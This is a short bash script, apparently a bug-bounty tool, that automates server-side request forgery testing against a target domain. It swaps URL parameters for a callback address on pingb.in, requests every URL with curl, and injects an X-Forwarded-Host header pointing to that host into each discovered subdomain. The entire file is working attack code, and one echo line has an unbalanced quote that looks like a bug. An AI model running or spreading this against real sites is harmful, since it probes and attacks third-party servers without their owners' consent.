#!/bin/bash
pingb=$(curl pingb.in 2>&1 | cut -d "\"" -f 2 | xargs | sed "s/.*\//\//g" | xargs -I{} echo {})
url="http://pingb.in$pingb" 
echo "Admin URL: $url" 
echo "Victim URL: http://pingb.in/p$pingb" 
echo "[+] Testing for SSRF..."
printf "\n"   #${1}.aliveURLs is basically gau + wayback urls passed through FFUF to find alive ones to be efficient. 
for i in $(cat ${1}.aliveURLs | sed 's/,,.*//g' | sed 's/,[[:digit:]].*//g' | sed 's/,/\n/g' | gf ssrf | qsreplace -a | qsreplace "http://pingb.in/p$pingb" | uniq | sort -u) ; do echo "[+] Running on $i at $(timedatectl | head -n 1 | awk '{print $5}')"" | tee -a ssrfResult ; curl -sifklL --max-redirs 3 $i 2>&1 >> ssrfResult; done
for j in $(assetfinder -subs-only $1 | httprobe -prefer-https); do ssrf=$(curl -L -s $j -H "X-Forwarded-Host: pingb.in/p$pingb");echo -e "$j--->X-Forwarded-Host Injected at $(timedatectl | head -n 1 | awk '{print $5}')"; done
